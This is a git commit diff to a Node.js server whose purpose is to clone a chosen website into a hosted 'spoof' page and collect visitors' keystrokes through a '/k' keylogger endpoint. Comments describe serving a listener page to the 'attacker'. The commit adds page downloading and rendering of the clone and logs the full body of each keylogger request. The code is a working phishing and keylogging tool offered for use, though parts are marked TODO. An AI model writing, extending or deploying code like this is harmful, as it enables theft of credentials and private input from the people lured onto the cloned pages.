b9589b55b6cd61e3cd9e79794c4f39140d1df67e
jake miller <jakemillerdev@gmail.com>
2021-07-18 21:26:31 -0700

    Removed command line args

--- index.js
+++ index.js
@@ -7,7 +7,7 @@ const http = require('http')
 const isURL = require('is-url')
 const path = require('path')
 const Cache = require('./models/Cache')
-const Page = require('./models/Page')
+const Spoof = require('./models/Spoof')
 const WebSocket = require('ws')
 let spoofURL = "https://www.google.com"
 const log = console.log
@@ -17,16 +17,6 @@ const app = exp()
 //* PAGE CACHE
 // production pages
 const page_cache = new Cache() // build new cache object
-
-// check for args
-let args = process.argv
-if(args[2] && isURL(args[2])){
-    log(`URL argument present - ${args[2]}`)
-    // set optional arg to spoofURL
-    spoofURL = args[2]
-} 
-
-
 
 //* STANDARD SERVER
 const server = http.createServer(app)
@@ -40,6 +30,7 @@ server.listen(PORT, (err) => {
 //* WEBSOCKET SERVER
 const wss = new WebSocket.Server({server})
 wss.on('connection', (ws)=>{
+    log('WSServer Listening')
     ws.on('message', (message) => {
         log(message)
     })
@@ -59,7 +50,7 @@ app.get('/:spoof_id', (req, res)=>{
     log("SPOOF VISIT: " + req.params.spoof_id)
     // 404 on non existant spoof or invalid url
     // if(!isURL(req.params.spoof_id)) return res.sendStatus(404)
-    if(!page_cache.pages[req.params.spoof_id]) return res.sendStatus(404)
+    if(!page_cache.pages[req.params.spoof_id]) return res.redirect('/')
     res.send(page_cache.pages[req.params.spoof_id].rendered_page)
 })
 //* INITITATE SPOOF AND SERVE LISTENER PAGE TO ATTACKER
@@ -68,36 +59,46 @@ app.post('/spoof', async (req, res)=>{ // takes in post form url field, and crea
     log(`Spoof request for __ ${url_2_spoof} __`)
     let spoofPageObject = await create_spoof(url_2_spoof) // should return new path of spoofed page
     // TODO Replace redirect with ejs render function containing listener socket
+    if(!spoofPageObject) return res.redirect('/')
     return res.render("spoofoutput.ejs", {page: spoofPageObject})
 })
 
 
 //! Handle creation of new pages for caching
 async function create_spoof(url){ // creates spoof site and socket session, returns spoof Page object
-    let new_page = new Page(url)
+    if(!isValid(url)) return null
+    let new_page = new Spoof(url)
+    let spoof_success = await new_page.downloadPage(url)
+    if(!spoof_success) return false
+    new_page.renderSpoof(url)
     // set into global pages object
     page_cache.addPage(new_page)
 
     //TODO Create new WS session
-   
-
-
     return new_page
+}
+function isValid(url){
+    if(isURL(url)) return true
+    return false
 }
 //? KEYLOGGER PATH
 app.post('/k', async (req, res)=>{
-    // log(req.body.key)
+    log(req.body)
 
     // handle sending the key to the correct socket session
 
     return res.sendStatus(200)
 })
 
-
+//? 404
+app.get('*', (req, res)=>{
+    return res.redirect('/')
+})
 
 
 
 //* DEBUGGING
+create_spoof("https://www.google.com")
 // easy to view log of rendered input/output
 // async function createLog(string){
 //     let filename = "log.txt"
